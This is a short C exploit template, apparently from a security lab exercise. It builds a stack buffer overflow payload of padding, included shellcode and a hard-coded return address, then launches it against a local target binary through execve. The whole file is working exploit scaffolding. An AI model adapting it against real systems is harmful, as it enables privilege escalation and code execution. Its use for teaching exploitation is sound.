/*
 * This template demonstrates how an exploit for a stack based
 * buffer overflow could be structured. Feel free to use it, or
 * write your own from scratch.
 *
 * The code does NOT match c4288bb0f38c68dd2258b0b941ccbb4534e286d5;
 * it is just a template and you need to change most of it.
 */

#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
#include "stack-shellcode.h"
};

#define START	0x8050d65;

int main(void)
{

	struct _overflow {
		/* Overflow filename with shellcode */
		char filename[4];
		char dot;
		char shellcode[50];
		uint32_t ret;
		unsigned char nul;  /* terminate string */
	} __attribute__((packed)) overflow;

	memset(&overflow, 'A', sizeof(overflow));
	overflow.dot = '.';
	memcpy(overflow.shellcode,shellcode,sizeof(shellcode));

	overflow.ret = START;

	overflow.nul = '\0';
	char *argv[] = { 	"./c4288bb0f38c68dd2258b0b941ccbb4534e286d5",
						"-read",
						(char*)&overflow,
						NULL };

	execve(argv[0], argv, NULL);

	return EXIT_FAILURE;
}
